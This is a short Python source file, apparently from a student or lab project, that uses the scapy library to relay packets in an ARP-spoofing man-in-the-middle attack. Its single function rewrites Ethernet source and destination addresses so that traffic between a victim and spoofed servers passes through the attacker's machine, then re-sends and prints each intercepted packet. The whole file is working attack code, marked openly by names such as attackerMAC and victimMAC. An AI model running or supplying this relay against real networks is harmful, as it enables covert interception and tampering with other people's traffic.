from scapy.all import *
from scapy.layers.inet import IP


def interceptARP(pkt, interceptedPkt, attackerMAC, spoofIP, serverMAC, victimMAC, networkInterface, forward):
    # update intercepted packet list
    interceptedPkt.append(pkt)

    # print("I got here")
    # case 1: victim request an IP which has as destination MAC of attacker
    # find corresponding MAC to that IP in array of spoffed IPs and
    # put as destination to the new packet
    if pkt[Ether].dst == attackerMAC:
        if pkt.haslayer(IP):
            if pkt[IP].dst in spoofIP:
                pkt[Ether].dst = serverMAC[spoofIP.index(pkt[IP].dst)]
            else:
                # case 2: server response for the request of the victim
                # so replace destination MAC to the MAC of victim
                pkt[Ether].dst = victimMAC

            # put src to attackerMAC as both arp tables of server and victim
            # maintain requested IP andresses under attacker MAC
            pkt[Ether].src = attackerMAC

            
            # send packet to the network
            if forward:
                sendp(pkt, iface=networkInterface)
            print(pkt.show())